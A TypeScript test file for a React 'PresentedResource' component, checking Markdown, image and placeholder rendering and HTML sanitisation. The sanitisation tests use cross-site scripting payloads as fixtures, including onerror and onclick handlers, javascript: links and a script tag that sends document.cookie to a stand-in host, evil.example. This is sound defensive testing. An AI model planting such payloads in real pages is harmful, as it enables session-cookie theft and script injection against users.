import { describe, expect, it } from 'vitest';
import { fireEvent, render, screen } from '@testing-library/react';
import { uuidSchema } from '@project/core';
import { PresentedResource } from '../src/index';

describe('PresentedResource', () => {
  it('renders the Markdown, parsed', () => {
    const { container } = render(
      <PresentedResource
        title="Hello"
        content={{
          kind: 'markdown',
          source: 'A paragraph with **bold** text.\n\n- one\n- two',
          via: 'self',
        }}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Hello' })).toBeInTheDocument();
    // The counterpart to the Resource's source editor: here the markers are
    // consumed and real elements come out.
    expect(container.querySelector('strong')?.textContent).toBe('bold');
    expect(container.querySelectorAll('li')).toHaveLength(2);
  });

  it('presents an Image Resource as its name and its image, the name as the text alternative', () => {
    render(
      <PresentedResource
        title={'Harbour\nAt dusk'}
        content={{ kind: 'image', url: 'https://example.com/h.png', via: 'self' }}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Harbour' })).toBeInTheDocument();
    expect(screen.getByRole('img', { name: 'Harbour' })).toHaveAttribute(
      'src',
      'https://example.com/h.png',
    );
  });

  /**
   * The Title ladder is the Resource front's and nothing else's (ADR 0083). A
   * presented Resource is a different surface with a different frame around it, so
   * it draws the Resource's **name** — and a heading is a single line of text
   * whatever the string handed to it contains, so a Title reaching one whole
   * would draw its lines run together with a space between them.
   */
  it('heads a presented Resource with the Resource’s name', () => {
    render(
      <PresentedResource
        title={'Auth\nHow a session begins'}
        content={{ kind: 'markdown', source: 'Body.', via: 'self' }}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Auth' })).toBeInTheDocument();
    expect(screen.queryByText(/How a session begins/u)).toBeNull();
  });

  it('presents a Reference Resource to an Image Resource as its Target’s image, with no Replace', () => {
    render(
      <PresentedResource
        title="Harbour, again"
        content={{ kind: 'image', url: 'https://example.com/h.png', via: 'reference' }}
      />,
    );

    const picture = screen.getByRole('img', { name: 'Harbour, again' });
    expect(picture).toHaveAttribute('src', 'https://example.com/h.png');
    fireEvent.error(picture);
    expect(screen.getByTestId('resource-image-failed')).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Replace image' })).toBeNull();
  });

  /**
   * What presenting a Space Resource should draw is `resource-content/07`'s
   * open question; until it is settled a presented Space Resource draws its
   * name and nothing below it, rather than an empty document.
   */
  it('presents a Space Resource as its name alone', () => {
    const { container } = render(
      <PresentedResource
        title="Roadmap"
        content={{
          kind: 'space',
          view: {
            spaceId: uuidSchema.parse('00000000-0000-4000-8000-000000000001'),
            map: uuidSchema.parse('00000000-0000-4000-8000-000000000002'),
            graph: uuidSchema.parse('00000000-0000-4000-8000-000000000003'),
            framing: undefined,
          },
          via: 'self',
        }}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Roadmap' })).toBeInTheDocument();
    expect(container.querySelector('.resource__body')).toBeNull();
    expect(screen.queryByTestId('unresolved-content')).toBeNull();
  });

  it('presents an unresolved Target as a notice, not an empty document', () => {
    const { container } = render(
      <PresentedResource title="Dangling" content={{ kind: 'unresolved', via: 'reference' }} />,
    );

    expect(screen.getByRole('heading', { name: 'Dangling' })).toBeInTheDocument();
    expect(screen.getByTestId('unresolved-content')).toHaveTextContent('Target not found');
    expect(container.querySelector('.resource__body')).toBeNull();
  });

  /**
   * The HTML goes in through `dangerouslySetInnerHTML`, so what `marked` emits
   * reaches the DOM. `marked` has no `sanitize` option and passes inline HTML
   * through verbatim, so unsanitised, every one of these would be live.
   *
   * These are asserted on the rendered DOM rather than on a sanitiser call,
   * because the property that matters is "no executable attribute survives into
   * the document", not "a particular function was invoked".
   */
  describe('sanitises the HTML it injects', () => {
    it('strips event-handler attributes', () => {
      const { container } = render(
        <PresentedResource
          title="T"
          content={{
            kind: 'markdown',
            source: '<img src=x onerror="alert(document.domain)">',
            via: 'self',
          }}
        />,
      );

      const img = container.querySelector('img');
      expect(img).not.toBeNull();
      // The element survives — sanitising is not escaping, and a resource that
      // legitimately embeds an image should still show one.
      expect(img?.getAttribute('onerror')).toBeNull();
      expect(container.innerHTML).not.toContain('onerror');
    });

    it('strips javascript: hrefs while keeping the link', () => {
      const { container } = render(
        <PresentedResource
          title="T"
          content={{ kind: 'markdown', source: '[click](javascript:alert(1))', via: 'self' }}
        />,
      );

      // Assert the anchor survives, not just that the scheme is gone: deleting
      // the whole element would satisfy the second check and quietly turn
      // sanitising into censoring.
      const link = container.querySelector('a');
      expect(link).not.toBeNull();
      expect(link?.textContent).toBe('click');
      expect(link?.getAttribute('href')).toBeNull();
      expect(container.innerHTML).not.toContain('javascript:');
    });

    it('drops script and iframe elements entirely', () => {
      const { container } = render(
        <PresentedResource
          title="T"
          content={{
            kind: 'markdown',
            source:
              '<script>fetch("//evil.example/"+document.cookie)</script>\n\n' +
              '<iframe src="javascript:alert(1)"></iframe>',
            via: 'self',
          }}
        />,
      );

      expect(container.querySelector('script')).toBeNull();
      expect(container.querySelector('iframe')).toBeNull();
      expect(container.innerHTML).not.toContain('evil.example');
    });

    it('strips inline handlers on anchors', () => {
      const { container } = render(
        <PresentedResource
          title="T"
          content={{
            kind: 'markdown',
            source: '<a href="#" onclick="alert(1)">x</a>',
            via: 'self',
          }}
        />,
      );

      expect(container.querySelector('a')?.getAttribute('onclick')).toBeNull();
      expect(container.innerHTML).not.toContain('onclick');
    });
  });
});
